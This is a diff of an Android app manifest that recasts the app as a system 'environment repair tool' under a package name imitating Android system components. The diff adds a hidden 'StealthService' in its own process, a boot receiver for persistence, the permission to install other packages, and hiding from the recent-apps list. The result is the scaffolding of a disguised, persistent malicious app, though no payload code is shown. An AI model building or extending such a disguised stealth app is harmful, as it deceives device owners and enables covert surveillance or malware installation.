@@ -1,14 +1,41 @@
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.android.system.hardware.ext"> <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
     <application
         android:allowBackup="false"
-        android:label="系统硬件工具" 
-        android:theme="@style/Theme.AppCompat.NoActionBar">
-        
-        <activity android:name=".MainActivity" android:exported="true">
-            <intent-filter>
+        android:icon="@android:drawable/ic_menu_manage" 
+        android:label="系统环境修复工具"
+        android:theme="@style/Theme.AppCompat.DayNight.NoActionBar"
+        tools:targetApi="34">
+
+        <activity
+            android:name="com.stealth.manager.MainActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"> <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
+                
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <service
+            android:name="com.stealth.manager.StealthService"
+            android:enabled="true"
+            android:exported="false"
+            android:process=":core"> </service>
+
+        <receiver
+            android:name="com.stealth.manager.BootReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
     </application>
+
 </manifest>
